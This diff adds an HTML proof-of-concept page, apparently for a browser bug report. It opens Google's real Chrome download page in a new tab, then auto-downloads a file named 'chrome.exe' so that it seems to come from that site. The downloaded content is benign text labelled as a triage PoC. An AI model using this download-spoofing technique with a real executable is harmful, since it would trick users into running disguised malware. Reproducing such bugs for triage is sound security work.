@@ -1,0 +1,29 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Safe Blob POC</title></head>
+<body>
+  <h3>Safe Blob POC — Click input</h3>
+  <button id="triggerInput">Click me to trigger</button>
+  <script>
+    document.getElementById('triggerInput').addEventListener('click', function() {
+      // open a new tab (shows real site URL)
+      window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?standalone=1&installdataindex=empty&defaultbrowser=0', '_blank');
+
+      // after short delay, create a harmless blob and trigger download
+      setTimeout(() => {
+        const text = "This is a benign PoC file used for reproduction and triage.\nDo not run as executable.";
+        const blob = new Blob([text], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'chrome.exe';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        // revoke after slight delay
+        setTimeout(() => URL.revokeObjectURL(url), 1000);
+      }, 400);
+    }, { once: false });
+  </script>
+</body>
+</html>
